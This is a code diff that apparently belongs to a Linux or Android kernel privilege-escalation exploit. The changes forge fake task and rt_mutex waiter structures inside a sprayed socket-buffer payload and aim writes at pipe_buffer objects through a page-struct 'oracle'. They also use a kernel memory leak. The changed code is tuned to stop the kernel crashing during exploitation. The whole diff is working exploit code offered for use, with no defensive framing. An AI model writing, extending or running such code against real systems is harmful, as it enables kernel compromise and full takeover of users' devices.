@@ -48,6 +48,9 @@ uintptr_t p0_gate_page_struct;
 uintptr_t p0_probe_page_struct;
 char ashmem_path[256] = "/dev/ashmem";
 long g_skb_data_delta = (long)SKB_DATA_DELTA;
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+int g_p0_gate_object_index = P0_ORACLE_GATE_OBJECT_INDEX;
+#endif
 
 void select_skb_data_delta(void) {
   const char *forced = getenv("SKB_DATA_DELTA");
@@ -81,6 +84,52 @@ void select_skb_data_delta(void) {
           (unsigned long long)(uint64_t)g_skb_data_delta);
 #endif
 }
+
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+void select_p0_gate_object_index(void) {
+  const char *forced = getenv("P0_GATE_OBJECT_INDEX");
+  if (forced && forced[0]) {
+    int value = atoi(forced);
+    if (value < 0) {
+      value = 0;
+    }
+    g_p0_gate_object_index = value % (int)PIPE_OBJS_PER_SLAB;
+    pr_info("p0 gate object index forced=%d\n", g_p0_gate_object_index);
+    return;
+  }
+#if defined(P0_ORACLE_GATE_OBJECT_INDEX_ROTATE) && \
+    P0_ORACLE_GATE_OBJECT_INDEX_ROTATE
+  static int rotate;
+  const char *idx_env = getenv("P0_GATE_INDEX_SEED");
+  if (idx_env && idx_env[0] && rotate == 0) {
+    rotate = atoi(idx_env);
+    if (rotate < 0) {
+      rotate = 0;
+    }
+  }
+  g_p0_gate_object_index = rotate % (int)PIPE_OBJS_PER_SLAB;
+  rotate++;
+  pr_info("p0 gate object index rotate=%d (of %d)\n",
+          g_p0_gate_object_index, (int)PIPE_OBJS_PER_SLAB);
+#else
+  g_p0_gate_object_index = P0_ORACLE_GATE_OBJECT_INDEX;
+  pr_info("p0 gate object index fixed=%d\n", g_p0_gate_object_index);
+#endif
+}
+
+int is_plausible_page_struct(uintptr_t page) {
+  if (page == 0) {
+    return 0;
+  }
+  if ((page & (STRUCT_PAGE_SIZE - 1)) != 0) {
+    return 0;
+  }
+  if (page < VMEMMAP_START || page >= VMEMMAP_END) {
+    return 0;
+  }
+  return 1;
+}
+#endif
 
 int is_plausible_reclaim_base(uintptr_t base) {
   if (base == 0) {
@@ -157,29 +206,43 @@ uintptr_t kernelsnitch_stable_mm_leak(void) {
  * kernel still takes pi_lock/wait_lock at base+delta+off. Zero every candidate
  * offset so a skew reads an unlocked qspinlock (0) instead of mm leftover
  * garbage that BRKs in queued_spin_lock_slowpath (RWC=41).
+ * Also clear pi_waiters / pi_blocked_on so a skew cannot leave a non-NULL
+ * waiter pointer with lock==NULL (RWC=48).
  */
+static void zero_pi_field(unsigned char *p, long off, size_t len) {
+  if (off < 0 || (size_t)off + len > ORDER3_SIZE) {
+    return;
+  }
+  memset(p + (size_t)off, 0, len);
+}
+
 static void zero_lock_words_for_delta_candidates(unsigned char *p) {
 #if defined(SKB_DELTA_CANDIDATES)
   static const long candidates[] = {SKB_DELTA_CANDIDATES};
+#else
+  static const long candidates[] = {0};
+#endif
   for (size_t ci = 0; ci < sizeof(candidates) / sizeof(candidates[0]); ci++) {
     for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
       size_t task_off =
           SLIDE_BANK_TASK_OFF + slot * SLIDE_BANK_TASK_STRIDE;
       size_t lock_off =
           SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
-      long pi = candidates[ci] + (long)task_off + (long)FAKE_TASK_PI_LOCK_OFF;
-      long wl = candidates[ci] + (long)lock_off;
+      long base = candidates[ci];
+      long pi = base + (long)task_off + (long)FAKE_TASK_PI_LOCK_OFF;
+      long wl = base + (long)lock_off;
+      long blocked = base + (long)task_off + (long)FAKE_TASK_PI_BLOCKED_ON_OFF;
+      long waiters = base + (long)task_off + (long)FAKE_TASK_PI_WAITERS_OFF;
       if (pi >= 0 && (size_t)pi + sizeof(uint32_t) <= ORDER3_SIZE) {
         put32(p, (size_t)pi, 0);
       }
       if (wl >= 0 && (size_t)wl + sizeof(uint32_t) <= ORDER3_SIZE) {
         put32(p, (size_t)wl, 0);
       }
+      zero_pi_field(p, blocked, sizeof(uint64_t));
+      zero_pi_field(p, waiters, 2 * sizeof(uint64_t));
     }
   }
-#else
-  (void)p;
-#endif
 }
 #endif
 
@@ -278,10 +341,15 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
   put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
   put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
   put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
+#if defined(SLIDE_EMPTY_FAKE_TASK_PI_WAITERS) && SLIDE_EMPTY_FAKE_TASK_PI_WAITERS
+  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, 0);
+  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+#else
   put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
         waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
   put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
         waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+#endif
   put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
   put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
 }
@@ -702,7 +770,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         if (slot == P0_ORACLE_GATE_SLOT) {
           parent = direct_to_page(base);
           target = pipebuf_page_base +
-                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+                   (uintptr_t)g_p0_gate_object_index * PIPE_OBJECT_SIZE;
           p0_gate_page_struct = parent;
         } else if (slot == P0_ORACLE_PROBE_SLOT) {
           uintptr_t direct_addr =
@@ -710,7 +778,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
               P0_ORACLE_PROBE_OFFSET;
           parent = direct_to_page(direct_addr);
           target = pipebuf_page_base +
-                   P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
+                   (uintptr_t)g_p0_gate_object_index * PIPE_OBJECT_SIZE +
                    sizeof(struct user_pipe_buffer);
           p0_probe_page_struct = parent;
         } else if (slot == P0_ORACLE_GATE_RESTORE_SLOT) {
@@ -736,11 +804,26 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         uintptr_t lock = payload_base + lock_off;
         uintptr_t waiter = payload_base + waiter_off;
 
+        /*
+         * Clear the entire PI-related tail of the fake task before planting.
+         * Leftover mm bytes at pi_blocked_on/pi_waiters caused RWC=48
+         * (spin_trylock(NULL) in rt_mutex_adjust_prio_chain).
+         */
+        if (task_off + FAKE_TASK_PI_LOCK_OFF + 0x40 <= ORDER3_SIZE) {
+          memset(p + task_off + FAKE_TASK_PI_LOCK_OFF, 0, 0x40);
+        }
+
         put32(p, lock_off + 0x00, 0);
         put64(p, lock_off + 0x08, waiter);
         put64(p, lock_off + 0x10, waiter);
         put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
 
+        /*
+         * Reclaim plant: keep waiters tree as a clean singleton (parent=1).
+         * Oracle write targets live on pi_tree for lock.waiters processing and
+         * on the pselect stack waiter. fake_task.pi_waiters stays empty so
+         * sched_setattr cannot walk pi_tree.left as a real waiter (RWC=48).
+         */
         put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
                         lock, SLIDE_FAKE_WAITER_PRIO);
 
@@ -749,35 +832,65 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
         put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
         put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
+#if defined(SLIDE_EMPTY_FAKE_TASK_PI_WAITERS) && SLIDE_EMPTY_FAKE_TASK_PI_WAITERS
+        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, 0);
+        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+#else
         put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
               waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
         put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
               waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+#endif
         put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
         put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
       }
       /* Fail-safer under delta skew: unlocked qspinlock at every candidate. */
       zero_lock_words_for_delta_candidates(p);
-      /* Re-assert primary layout wait_lock/pi_lock after safety zeros. */
+      /* Re-assert primary layout wait_lock/pi fields after safety zeros. */
       for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
         size_t task_off =
             SLIDE_BANK_TASK_OFF + slot * SLIDE_BANK_TASK_STRIDE;
         size_t lock_off =
             SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
+        size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
+        uintptr_t waiter = payload_base + waiter_off;
         put32(p, lock_off + 0x00, 0);
         put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
+        put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+#if defined(SLIDE_EMPTY_FAKE_TASK_PI_WAITERS) && SLIDE_EMPTY_FAKE_TASK_PI_WAITERS
+        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, 0);
+        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+        (void)waiter;
+#else
+        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
+              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+        put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+              waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+#endif
       }
     }
     pr_info("slide skb payload base=%016zx payload_base=%016zx delta=%lld "
             "gate_magic@0x%x reclaim_magic@0x40 primary_task=%016zx "
             "primary_lock=%016zx primary_pi_lock=%016zx "
-            "oracle_parent=%016zx oracle_target=%016zx pipebuf=%016zx\n",
+            "oracle_parent=%016zx oracle_target=%016zx pipebuf=%016zx "
+            "gate_index=%d empty_pi_waiters=%d\n",
             base, payload_base, (long long)g_skb_data_delta,
             (unsigned)P0_ORACLE_GATE_PAGE_OFF,
             payload_base + SLIDE_BANK_TASK_OFF,
             payload_base + SLIDE_BANK_LOCK_OFF,
             payload_base + SLIDE_BANK_TASK_OFF + FAKE_TASK_PI_LOCK_OFF,
-            slide_bank_parents[0], slide_bank_targets[0], pipebuf_page_base);
+            slide_bank_parents[0], slide_bank_targets[0], pipebuf_page_base,
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+            g_p0_gate_object_index,
+#else
+            (int)P0_ORACLE_GATE_OBJECT_INDEX,
+#endif
+#if defined(SLIDE_EMPTY_FAKE_TASK_PI_WAITERS) && SLIDE_EMPTY_FAKE_TASK_PI_WAITERS
+            1
+#else
+            0
+#endif
+    );
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
     return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
 #else
